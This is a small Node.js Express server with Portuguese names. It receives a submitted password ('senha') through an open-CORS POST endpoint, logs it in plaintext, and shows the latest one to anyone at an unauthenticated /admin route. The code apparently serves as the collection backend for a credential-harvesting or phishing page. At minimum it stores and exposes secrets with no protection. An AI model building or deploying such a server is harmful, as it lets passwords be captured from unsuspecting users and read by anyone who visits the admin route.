const express = require('express');
const cors = require('cors');
const app = express();

let senhaRecebida = "";

app.use(cors());
app.use(express.json());

app.post('/api/senha', (req, res) => {
  senhaRecebida = req.body.senha;
  console.log("Senha recebida:", senhaRecebida);
  res.status(200).send("Senha recebida.");
});

app.get('/admin', (req, res) => {
  res.send(`Senha mais recente recebida: ${senhaRecebida}`);
});

app.get('/', (req, res) => {
  res.send("Servidor rodando.");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
